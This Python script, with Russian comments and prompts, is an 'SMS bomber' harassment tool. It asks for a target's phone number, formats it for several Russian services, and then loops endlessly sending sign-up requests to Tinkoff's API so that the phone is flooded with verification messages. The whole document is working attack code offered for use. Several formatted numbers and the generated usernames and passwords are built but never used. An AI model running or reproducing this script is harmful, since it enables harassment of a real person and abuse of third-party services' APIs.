import requests
import re
import random
import time

def bomber():
    _phone = input("Введите номер телефона: ")
    
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        iteration = 0
    while True:
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        try:
            # Посылаем запрос, в котором мы будем хранить номер телефона
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            # Печатаем что все отправилось успешно
            print('[+] Tinkoff отправлено!')
        except Exception as ex:
            # Если появилась ошибка (ex), мы ее выедем 
            print('[-] Tinkoff не отправлено!' + str(ex))
    
        try:
               iteration += 1
               print(('{} круг пройден.').format(iteration))
        except:
            break
